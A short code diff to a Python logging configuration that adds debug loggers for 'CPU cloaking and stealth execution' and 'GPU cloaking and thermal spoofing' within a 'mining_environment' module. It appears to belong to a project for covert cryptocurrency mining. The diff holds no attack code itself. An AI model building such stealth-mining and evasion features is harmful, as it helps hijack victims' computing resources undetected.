@@ -43,6 +43,18 @@ class UnifiedLoggerManager:
             'file': 'cloak_strategies.log',
             'description': 'Cloaking strategy implementations'
         },
+        'mining_environment.cpu_cloaking': {
+            # 🔧 CPU-specific cloaking operations (Emergency Fix)
+            'level': logging.DEBUG,
+            'file': 'cpu_cloaking_manager.log',
+            'description': 'CPU cloaking and stealth execution operations'
+        },
+        'mining_environment.gpu_cloaking': {
+            # 🔧 GPU-specific cloaking operations (Emergency Fix)
+            'level': logging.DEBUG,
+            'file': 'gpu_cloaking_manager.log',
+            'description': 'GPU cloaking and thermal spoofing operations'
+        },
         'mining_environment.resource_control': {
             # ⚙️ Nâng mức log lên DEBUG để ghi chi tiết điều khiển tài nguyên
             'level': logging.DEBUG,
